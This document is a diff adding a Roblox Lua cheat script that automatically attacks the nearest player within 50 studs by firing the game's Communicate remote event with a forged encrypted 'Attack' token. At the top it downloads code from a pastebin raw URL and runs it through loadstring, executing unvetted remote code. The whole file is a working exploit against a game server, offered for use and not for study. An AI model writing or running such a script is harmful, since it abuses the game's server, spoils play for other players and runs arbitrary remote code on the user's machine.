@@ -1,0 +1,64 @@
+local player = game.Players.LocalPlayer
+local character = player.Character
+local localroot = character:WaitForChild("HumanoidRootPart")
+local url = "https://pastebin.com/raw/Vh2xiXZX"
+
+local response = request({
+    Url = url,
+    Method = "GET"
+})
+
+local loadedModule = loadstring(response.Body)()
+
+local function closest()
+    local range = 50
+    local target = nil
+    for _, v in pairs(game.Players:GetPlayers()) do
+        if v ~= player and v.Character and not v.Character:FindFirstChildWhichIsA("ForceField") then
+            local JN = v.Character:FindFirstChild("HumanoidRootPart")
+            local JNR = v.Character:FindFirstChildOfClass("Humanoid")
+            if JN and JNR.Health > 0 then
+                local dist = (localroot.Position - JN.Position).magnitude
+                if dist < range then
+                    range = dist
+                    target = v.Character
+                end
+            end
+        end
+    end
+    return target
+end
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    character = char
+    localroot = character:WaitForChild("HumanoidRootPart")
+end)
+
+local jh = closest()
+game:GetService("RunService").Heartbeat:Connect(function()
+    jh = closest()
+end)
+
+while game:GetService("RunService").Heartbeat:Wait() do
+    wait(1)
+    if jh and jh:FindFirstChild("Head") then
+        pcall(function()
+            local encrypted, extra_info = loadedModule.Encrypt("Attack", "FrogWasHere")
+
+            local vroot = jh:FindFirstChild("Head")
+            local args = {
+                [1] = encrypted,
+                [2] = {
+                    ["Limb"] = "Head",
+                    ["Character"] = jh,
+                    ["Point"] = Vector3.new(vroot.Position.X, vroot.Position.Y, vroot.Position.Z),
+                    ["Hit"] = vroot
+                },
+                [3] = false,
+                [4] = extra_info
+            }
+
+            game:GetService("Players").LocalPlayer.Character.Core.Communicate:FindFirstChild(""):FireServer(unpack(args))
+        end)
+    end
+end
